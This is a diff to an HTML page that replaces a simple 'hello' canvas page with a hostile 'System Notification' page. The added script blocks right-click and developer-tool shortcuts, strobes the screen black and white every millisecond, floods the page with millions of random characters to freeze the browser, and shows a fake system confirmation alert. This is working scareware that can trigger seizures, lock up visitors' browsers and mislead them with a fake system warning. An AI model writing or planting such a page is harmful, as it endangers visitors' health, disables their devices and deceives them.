@@ -1,64 +1,25 @@
-<!doctype html>
-<html lang="ru">
+<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
-<title>hello</title>
+<meta charset="UTF-8">
+<title>System Notification</title>
 <style>
-  html,body{height:100%;margin:0;background:#000;color:#fff;font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}
-  #wrap{height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
-  .loader{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000;z-index:999999}
-  .spinner{width:56px;height:56px;border-radius:50%;border:6px solid rgba(255,255,255,0.06);border-top-color:rgba(255,255,255,0.9);animation:spin 1s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
+html,body{margin:0;padding:0;height:100%;overflow:hidden;background:black;color:white;font-size:20px;font-family:sans-serif;}
 </style>
 </head>
 <body>
-<div id="root"><div id="wrap"></div></div>
-<div id="loader" class="loader" style="display:none"><div class="spinner" aria-hidden="true"></div></div>
-
 <script>
-(function(){
-  const isMobile = /Mobi|Android|iPhone|iPad|iPod|Windows Phone|webOS/i.test(navigator.userAgent) || Math.max(screen.width, screen.height) <= 900;
-  const showLoader = ()=>{ document.getElementById('loader').style.display='flex'; };
-  const initMobile = ()=>{
-    const wrap = document.getElementById('wrap');
-    const canvas = document.createElement('canvas');
-    canvas.id = 'c';
-    wrap.appendChild(canvas);
-    const ctx = canvas.getContext('2d');
-    const DPR = window.devicePixelRatio || 1;
-    function resize(){
-      const w = Math.max(window.innerWidth,320);
-      const h = Math.max(window.innerHeight,200);
-      canvas.width = Math.floor(w * DPR);
-      canvas.height = Math.floor(h * DPR);
-      canvas.style.width = w + 'px';
-      canvas.style.height = h + 'px';
-      draw();
-    }
-    function draw(){
-      const w = canvas.width;
-      const h = canvas.height;
-      ctx.setTransform(1,0,0,1,0,0);
-      ctx.fillStyle = '#000';
-      ctx.fillRect(0,0,w,h);
-      const baseSize = Math.floor(Math.min(w,h) * 0.18 * 100);
-      ctx.font = `900 ${baseSize}px "Segoe UI", Roboto, Helvetica, Arial, sans-serif`;
-      ctx.textAlign = 'center';
-      ctx.textBaseline = 'middle';
-      ctx.fillStyle = '#fff';
-      ctx.fillText('hello', w/2, h/2);
-    }
-    window.addEventListener('resize', resize);
-    resize();
-  };
-  try{
-    if(!isMobile) showLoader();
-    else initMobile();
-  }catch(e){
-    showLoader();
-  }
-})();
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('keydown',e=>{
+if(e.keyCode==123||e.ctrlKey&&e.shiftKey&&e.keyCode==73||e.ctrlKey&&e.keyCode==85){e.preventDefault();}
+});
+let bg=true;
+setInterval(()=>{document.body.style.background=bg?'black':'white';document.body.style.color=bg?'white':'black';bg=!bg;},1);
+function randomSymbols(len){let s='';const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:",.<>?/`~';for(let i=0;i<len;i++){s+=chars.charAt(Math.floor(Math.random()*chars.length));}return s;}
+let spam='';
+for(let i=0;i<20000;i++){spam+=randomSymbols(200)+'\n';}
+document.body.innerText=spam;
+setTimeout(()=>{alert("System Browser Confirmation Required");},500);
 </script>
 </body>
 </html>
